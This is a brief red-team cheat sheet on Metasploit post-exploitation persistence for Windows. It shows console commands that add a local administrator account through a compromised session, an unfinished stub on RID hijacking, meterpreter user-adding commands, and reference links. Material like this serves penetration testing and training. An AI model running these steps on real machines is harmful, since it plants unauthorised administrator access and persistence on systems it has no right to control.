# Metasploit

## 01 - Create Local User

```
msf post(windows/manage/add_user) > options

Module options (post/windows/manage/add_user):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   ADDTODOMAIN  true             yes       Add to Domain if true, otherwise add locally
   ADDTOGROUP   false            yes       Add group if it does not exist
   GROUP                         no        Add user into group, creating it if necessary
   PASSWORD                      no        Password of the user
   SESSION                       yes       The session to run this module on.
   TOKEN                         no        Username or PID of the token which will be used (if blank, Domain Admin tokens will be enumerated)
   USERNAME                      yes       The username of the user to add (not-qualified, e.g. BOB)

msf post(windows/manage/add_user) > set username sysadmin

msf post(windows/manage/add_user) > set password s3cUrePassw0rd!

msf post(windows/manage/add_user) > set addtodomain false

msf post(windows/manage/add_user) > set addtogroup true

msf post(windows/manage/add_user) > set group administrators

msf post(windows/manage/add_user) > set session <number>

msf post(windows/manage/add_user) > run
```

## 02 - RID Hijack

TODO: Fill this info

```
msf > use post/windows/manage/rid_hijack

msf post(windows/manage/rid_hijack) > options

msf post(windows/manage/rid_hijack) > set username <username>
```

## 03 - Add Tokens

```
meterpreter > add_user

meterpreter > add_localgroup_user
```

---
## References

### Rapid7

- [Rapid7: Metasploit Framework - RID Hijack Post Module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/manage/rid_hijack.md)

### Red Team Notes

- [Red Team Notes: RID Hijacking](https://www.ired.team/offensive-security/persistence/rid-hijacking)